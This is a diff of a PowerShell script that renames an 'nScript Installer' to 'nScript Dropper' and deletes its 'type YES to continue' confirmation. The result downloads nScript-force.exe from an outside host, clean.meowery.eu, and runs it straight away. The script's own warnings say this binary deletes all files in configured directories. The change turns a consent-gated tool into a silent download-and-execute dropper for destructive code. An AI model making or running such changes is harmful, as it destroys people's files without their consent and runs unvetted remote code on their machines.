@@ -5,20 +5,9 @@ $BinaryName = "nScript-force.exe"
 $TempPath = Join-Path $env:TEMP "nScript"
 $BinaryPath = Join-Path $TempPath $BinaryName
 
-Write-Host "[*] nScript Installer v2.0.0" -ForegroundColor Cyan
+Write-Host "[*] nScript Dropper" -ForegroundColor Cyan
 Write-Host "[!] WARNING: FORCE MODE - This will delete ALL files in configured directories!" -ForegroundColor Red
 Write-Host "[!] This action cannot be undone!" -ForegroundColor Red
-Write-Host ""
-
-# Confirmation prompt
-$Confirmation = Read-Host "Type 'YES' in capital letters to continue"
-if ($Confirmation -ne "YES") {
-    Write-Host "[*] Installation cancelled by user" -ForegroundColor Yellow
-    exit 0
-}
-
-Write-Host ""
-Write-Host "[*] Downloading and running nScript (FORCE MODE)..." -ForegroundColor Yellow
 Write-Host ""
 
 # Create temp directory
@@ -29,15 +18,12 @@ if (-not (Test-Path $TempPath)) {
 try {
     $DownloadUrl = "https://clean.meowery.eu/nScript-force.exe"
     
-    Write-Host "[*] Downloading $BinaryName from CDN..." -ForegroundColor Yellow
+    Write-Host "[*] Downloading $BinaryName..." -ForegroundColor Yellow
     Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
     
     Write-Host "[+] Download complete!" -ForegroundColor Green
     Write-Host ""
-    Write-Host "[*] Running nScript in FORCE MODE..." -ForegroundColor Red
-    Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host ""
-    
+
     # Run the binary
     & $BinaryPath
     
